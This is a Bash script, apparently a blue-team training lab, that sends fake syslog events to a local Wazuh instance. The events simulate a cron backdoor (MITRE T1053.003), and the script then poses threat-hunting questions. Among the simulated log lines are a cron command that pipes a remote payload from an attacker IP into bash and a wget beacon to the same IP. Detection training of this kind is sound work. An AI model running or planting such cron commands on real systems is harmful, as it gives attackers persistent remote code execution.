#!/bin/bash

# ============================================================
#  SIMULATION — Persistance via Cron (Niveau 2)
#  MITRE ATT&CK : T1053.003 — Scheduled Task/Job: Cron
# ============================================================

WAZUH_IP="127.0.0.1"
SYSLOG_PORT="514"
HOSTNAME="server-prod-01"
ATTACKER_IP="192.168.100.50"  # Même IP que niveau 1 (corrélation)

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

echo ""
echo "============================================================"
echo -e "  ${RED}[SIMULATION] Cron Backdoor — Niveau 2${NC}"
echo "============================================================"
echo ""
echo -e "  ${YELLOW}MITRE${NC} : T1053.003 — Scheduled Task: Cron"
echo -e "  ${YELLOW}Host${NC}  : $HOSTNAME"
echo ""

DATE=$(date '+%b %d %H:%M:%S')

send_syslog() {
    printf "<38>%s %s %s\n" "$DATE" "$HOSTNAME" "$1" | nc -u -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null || \
    printf "<38>%s %s %s\n" "$DATE" "$HOSTNAME" "$1" | nc -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null
}

echo -e "${CYAN}[*] Phase 1 — Modification de /etc/crontab...${NC}"
send_syslog "ossec: File '/etc/crontab' modified. Mode: 644. Owner: root."
send_syslog "ossec: Integrity checksum changed for '/etc/crontab'"
sleep 0.5

echo -e "${CYAN}[*] Phase 2 — Ajout d'un cron job malveillant...${NC}"
send_syslog "cron[1337]: (root) REPLACE (root)"
send_syslog "crontab[1338]: (root) BEGIN EDIT (root)"
send_syslog "crontab[1338]: (root) END EDIT (root)"
sleep 0.5

echo -e "${CYAN}[*] Phase 3 — Nouveau fichier dans /etc/cron.d/...${NC}"
send_syslog "ossec: New file '/etc/cron.d/system-update' added. Owner: root."
send_syslog "ossec: File added to the file system: '/etc/cron.d/system-update'"
sleep 0.5

echo -e "${CYAN}[*] Phase 4 — Exécution du cron malveillant...${NC}"
send_syslog "cron[1339]: (root) CMD (curl -s http://192.168.100.50/payload.sh | bash)"
send_syslog "cron[1340]: (root) CMD (wget -qO- http://192.168.100.50/beacon > /dev/null 2>&1)"
sleep 0.3

echo ""
echo "============================================================"
echo -e "  ${GREEN}Simulation terminée${NC}"
echo "============================================================"
echo ""
echo "  Dans Wazuh → Threat Hunting :"
echo ""
echo -e "  ${CYAN}1. Filtre : agent.name: $HOSTNAME${NC}"
echo "     Cherche des alertes FIM sur /etc/cron*"
echo "     rule.groups: syscheck"
echo ""
echo -e "  ${CYAN}2. Questions :${NC}"
echo "     → Quel fichier a été modifié/créé ?"
echo "     → À quelle heure ? (horaire inhabituel ?)"
echo "     → Que fait la commande cron injectée ?"
echo "     → Cette IP te rappelle quelque chose ? (niveau 1...)"
echo ""
echo -e "  ${CYAN}3. Corrélation avec niveau 1 :${NC}"
echo "     L'IP $ATTACKER_IP est la même que le brute force SSH."
echo "     → L'attaquant a réussi à entrer et installe une backdoor !"
echo ""
